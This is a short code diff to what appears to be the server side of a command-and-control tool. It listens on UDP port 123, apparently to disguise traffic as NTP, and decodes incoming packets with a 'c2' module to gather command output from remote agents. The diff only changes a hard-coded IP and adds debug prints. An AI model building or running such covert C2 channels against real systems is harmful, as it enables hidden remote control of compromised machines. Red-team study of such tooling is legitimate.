@@ -10,7 +10,7 @@ from server import ntpserver, c2
 
 def start(agentDB):
     while True:
-        ip = "129.21.100.241" #TODO change to get my ip
+        ip = "129.21.103.180" #TODO change to get my ip
         port = 123
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,8 +19,10 @@ def start(agentDB):
 
         datahold = ""
         while True:
+            print('getting something')
             data, addr = sock.recvfrom(2048)
             ip = addr[0]
+            #print(data, addr)
 
             strdata = c2.decode(data)
 
@@ -28,7 +30,7 @@ def start(agentDB):
                 idx = strdata.index("COM")
                 datahold += strdata[idx+4:]
                 if "COMQ" in strdata:
-                    c2.getCMDOutput()
+                    c2.printOutput()
                     datahold = ""
 
             else: #this means resync/ping
